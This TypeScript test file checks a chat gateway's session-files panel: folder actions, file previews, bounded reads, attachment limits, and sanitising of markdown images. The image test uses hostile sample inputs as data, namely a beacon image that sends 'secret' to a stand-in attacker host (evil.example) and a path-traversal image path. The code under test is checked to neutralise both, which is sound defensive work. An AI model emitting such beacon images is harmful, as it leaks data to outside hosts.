import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";
import { Markdown, formatBytes, workspaceContentUrl, type RunWorkspace } from "@abstractframework/panel-chat";
import {
  PREVIEW_TEXT_LIMIT,
  SessionFiles,
  attachOutcomeNotice,
  attachPrecheck,
  attachWorkspaceFile,
  partialPreviewNote,
  readBoundedText,
  safeMarkdownImages,
  canOpenFolder,
} from "./session_files";
import { FileViewer, WorkspaceBrowserView } from "@abstractframework/panel-chat";

const noop = () => {};
const info = (patch: Partial<RunWorkspace> = {}): RunWorkspace => ({
  workspace_root: "/Users/me/.abstractgateway/workspaces/session-abc",
  kind: "session",
  session_id: "abc",
  exists: true,
  host: { hostname: "studio.local", caller_is_this_machine: true },
  open_supported: true,
  ...patch,
});
describe("open folder (round 4: an icon beside the short root name)", () => {
  it("is offered only to a browser on the gateway machine that can open folders", () => {
    expect(canOpenFolder(info())).toBe(true);
    expect(canOpenFolder(info({ open_supported: false }))).toBe(false);
    expect(canOpenFolder(info({ host: { hostname: "studio.local", caller_is_this_machine: false } }))).toBe(false);
  });

  it("the root shows once as its short name, with open-folder and copy-path icons", () => {
    const html = renderToStaticMarkup(
      <WorkspaceBrowserView title="Conversation files" where={info()} path="" listing={{ path: "", entries: [], truncated: false }}
        error="" loading={false} fileBusy="" onNavigate={noop} onRefresh={noop} onCopyPath={noop} onOpenFolder={noop} />,
    );
    expect(html).toContain('title="/Users/me/.abstractgateway/workspaces/session-abc"');
    expect(html).toContain(">session-abc</span>");
    expect(html).toContain('data-action="open-folder"');
    expect(html).toContain('data-action="copy-path"');
    expect(html.split("/Users/me/.abstractgateway").length - 1).toBe(2); // title + data-workspace-root only, never printed
  });
});

describe("session workspace listing", () => {
  // Listing, routes and validation are the shared panel-chat WorkspaceBrowser
  // (tested in abstractuic); here: the pane renders it, titled, for the run.
  it("renders the shared workspace browser for the run, with its title", () => {
    const html = renderToStaticMarkup(
      <SessionFiles runId="r1" enabled heading="Automation folder" onAttachFiles={() => []} />,
    );
    expect(html).toContain('class="pc-ws code-workspace-browser"');
    expect(html).toContain('aria-label="Automation folder"');
  });

  it("shows nothing but the empty state before there is a run", () => {
    const html = renderToStaticMarkup(
      <SessionFiles runId="" enabled onAttachFiles={() => []} />,
    );
    expect(html).not.toContain("pc-ws");
    expect(html).toContain("This conversation&#x27;s files appear here.");
  });
});

describe("file preview (the kit's shared FileViewer)", () => {
  it("shows HTML as highlighted source, never rendered", () => {
    const html = renderToStaticMarkup(<FileViewer name="page.html" nowMs={0} status="ready" text="<b>hi</b>" />);
    expect(html).toContain("&lt;b&gt;hi&lt;/b&gt;");
    expect(html).not.toContain("<b>hi</b>");
    expect(html).toContain('data-kind="code"');
  });

  it("renders markdown, says when a preview is partial, and surfaces the gateway's error", () => {
    expect(renderToStaticMarkup(<FileViewer name="a.md" nowMs={0} status="ready" text="**bold**" />)).toContain("<strong>bold</strong>");
    expect(renderToStaticMarkup(<FileViewer name="a.txt" nowMs={0} status="ready" text="x" partialNote={partialPreviewNote(3 * 1024 * 1024)} />))
      .toContain("Showing the first 1 MiB of 3.0 MiB; download for the rest.");
    expect(renderToStaticMarkup(<FileViewer name="a.txt" nowMs={0} status="error" error="Preview failed (HTTP 404): no route" />))
      .toContain("Preview failed (HTTP 404): no route");
  });
});

describe("attach a workspace file (the viewer's Attach action)", () => {
  const entry = { name: "big.bin", path: "out/big.bin", type: "file" as const, size_bytes: 10 };
  it("refuses over the gateway limit BEFORE downloading", async () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch");
    const text = await attachWorkspaceFile("r1", { ...entry, size_bytes: 5000 }, 1000, () => []);
    expect(text).toMatch(/^Not attached: /);
    expect(fetchSpy).not.toHaveBeenCalled();
    fetchSpy.mockRestore();
  });
  it("queues the file and never claims success before the upload", async () => {
    const fetchSpy = vi.spyOn(globalThis, "fetch").mockResolvedValue(new Response("abc", { status: 200, headers: { "content-length": "3" } }));
    const files: File[] = [];
    const text = await attachWorkspaceFile("r1", entry, 1000, (f) => { files.push(...f); return [{ id: "u", name: "big.bin", status: "uploading" } as any]; });
    expect(files.map((f) => f.name)).toEqual(["big.bin"]);
    expect(text).toBe("big.bin is uploading; its chip in the message box shows when it is attached.");
    expect(String(fetchSpy.mock.calls[0][0])).toContain("workspace/content?path=out%2Fbig.bin");
    fetchSpy.mockRestore();
  });
});

describe("bounded text preview", () => {
  const body = (bytes: number) => new Uint8Array(bytes).fill(97);

  it("reads only the first 1 MiB of a large file even when the server ignores Range", async () => {
    const total = 3 * 1024 * 1024;
    const response = new Response(body(total), { status: 200, headers: { "content-length": String(total) } });
    const read = await readBoundedText(response, PREVIEW_TEXT_LIMIT);
    expect(read.received).toBe(PREVIEW_TEXT_LIMIT);
    expect(read.text.length).toBe(PREVIEW_TEXT_LIMIT);
    expect(read).toMatchObject({ partial: true, total });
    expect(partialPreviewNote(read.total)).toBe("Showing the first 1 MiB of 3.0 MiB; download for the rest.");
  });

  it("takes the size from Content-Range when the listing gives none", async () => {
    const response = new Response(body(1024), { status: 206, headers: { "content-range": "bytes 0-1023/5000" } });
    const read = await readBoundedText(response, 1024);
    expect(read).toMatchObject({ received: 1024, total: 5000, partial: true });
  });

  it("is complete when the whole file fits", async () => {
    const response = new Response("hello", { status: 206, headers: { "content-range": "bytes 0-4/5" } });
    expect(await readBoundedText(response, PREVIEW_TEXT_LIMIT)).toMatchObject({ text: "hello", partial: false, total: 5 });
  });

  it("says the size is unknown rather than guessing", () => {
    expect(partialPreviewNote(undefined)).toContain("a file of unknown size");
  });
});

describe("attach from the workspace", () => {
  const big = { name: "dump.bin", path: "dump.bin", type: "file" as const, size_bytes: 5 * 1024 * 1024 };

  it("applies the gateway's size limit before downloading", () => {
    expect(attachPrecheck(big, 1024 * 1024)).toBe("dump.bin is 5 MB; the gateway accepts files up to 1 MB.");
    expect(attachPrecheck(big, undefined)).toBeNull();
    expect(attachPrecheck({ ...big, size_bytes: 10 }, 1024)).toBeNull();
  });

  it("never claims success for a refused file and names the reason", () => {
    const refused = { id: "1", name: "a", size: 9, status: "refused" as const, file: new File(["x"], "a"), message: "a is 9 B; the gateway accepts files up to 1 B." };
    expect(attachOutcomeNotice("a", refused)).toBe("Not attached: a is 9 B; the gateway accepts files up to 1 B.");
    expect(attachOutcomeNotice("a", { ...refused, status: "queued", message: undefined })).not.toContain("added");
    expect(attachOutcomeNotice("a", undefined)).toContain("not queued");
  });
});

describe("markdown preview images", () => {
  it("renders workspace images and turns remote ones into links", () => {
    vi.stubGlobal("document", { baseURI: "http://code.test/apps/code/" });
    const md = [
      "![plot](figs/plot.png)",
      "![beacon](https://evil.example/t.gif?d=secret)",
      "Inline ![pix](//evil.example/p.png) text",
      "![up](../../escape.png)",
      "```",
      "![code](https://example.com/in-code.png)",
      "```",
    ].join("\n");
    const safe = safeMarkdownImages(md, "r1", "docs/README.md");
    expect(safe).toContain("![plot](api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png)");
    expect(safe).toContain("[image: beacon](https://evil.example/t.gif?d=secret)");
    expect(safe).toContain("[image: pix](//evil.example/p.png)");
    expect(safe).toContain("[image: up](../../escape.png)");
    expect(safe).toContain("![code](https://example.com/in-code.png)");
    const html = renderToStaticMarkup(<Markdown text={safe.split("```")[0]} />);
    expect(html).toContain('src="api/gateway/runs/r1/workspace/content?path=docs%2Ffigs%2Fplot.png"');
    vi.unstubAllGlobals();
    expect(html).not.toMatch(/<img[^>]+src="(https?:)?\/\/evil/);
  });
});
